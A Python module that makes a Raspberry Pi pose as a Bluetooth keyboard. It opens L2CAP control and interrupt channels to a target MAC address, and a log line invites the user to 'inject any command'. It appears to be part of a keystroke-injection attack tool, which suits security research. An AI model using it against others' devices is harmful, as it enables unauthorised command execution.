#!/usr/bin/python3

from __future__ import absolute_import, print_function
import os
import sys
import dbus
import dbus.service
import dbus.mainloop.glib
import socket
import tools.emulator.rules.constants as consts
from logging import error
from bluetooth import *
from tools.utils.logs import logger

class KbDevice():
    MAC_ADDRESS = ""

    P_CTRL = 17
    P_INTR = 19

    SDP_RECORD_PATH = sys.path[0] + "/tools/emulator/sdp_record.xml"
    UUID = "00001124-0000-1000-8000-00805f9b34fb"

    def __init__(self, mac_address: str):
        self.MAC_ADDRESS = mac_address
        logger.status(msg="Setting up Raspberry Pi as Bluetooth Keyboard Device...")
        self.init_bluez_profile()

    def init_bluez_profile(self):
        logger.status(msg="Configuring BlueZ profile...")
        service_record = self.read_sdp_service_record()
        opts = {
            "AutoConnect": True,
            "ServiceRecord": service_record
        }
        bus = dbus.SystemBus()
        manager = dbus.Interface(bus.get_object(bus_name="org.bluez", object_path="/org/bluez"), "org.bluez.ProfileManager1")
        try:
            manager.RegisterProfile("/org/bluez/hci0", KbDevice.UUID, opts)
        except dbus.exceptions.DBusException:
            logger.status(msg="UUID already registered")
            pass
        
        logger.status(msg="Setting up Bluetooth class as HID...")
        os.system("hciconfig hci0 class 0x2c0540")

    def read_sdp_service_record(self):
        logger.status(msg="Reading Service Record...")
        try:
            fh = open(KbDevice.SDP_RECORD_PATH, "r")
        except:
            sys.exit("Could not open the sdp record. Exiting...")
        
        return fh.read()

    def connect(self):
        logger.status(msg=f"Attempting to connect to {self.MAC_ADDRESS}...")

        # コントロールチャンネルの作成と接続
        self.scontrol = socket.socket(socket.AF_BLUETOOTH, 
                                     socket.SOCK_SEQPACKET, 
                                     consts.BTPROTO_L2CAP)
        self.scontrol.connect((self.MAC_ADDRESS, self.P_CTRL))
        logger.status(f"Connected to the control channel of {self.MAC_ADDRESS} at {self.P_CTRL}")

        # 割り込みチャンネルの作成と接続
        self.sinterrupt = socket.socket(socket.AF_BLUETOOTH, 
                                       socket.SOCK_SEQPACKET, 
                                       consts.BTPROTO_L2CAP)
        self.sinterrupt.connect((self.MAC_ADDRESS, self.P_INTR))
        logger.status(f"Connected to the interrupt channel of {self.MAC_ADDRESS} at {self.P_INTR}")
        logger.success("You can inject any command you wish. Start a new terminal and try command injection with the make boot/injector command !!")

    # send a string to the bluetooth host machine
    def send_string(self, message):
        try:
            # self.cinterrupt.send(bytes(message))
            self.sinterrupt.send(bytes(message))
        except OSError as err:
            error(err)
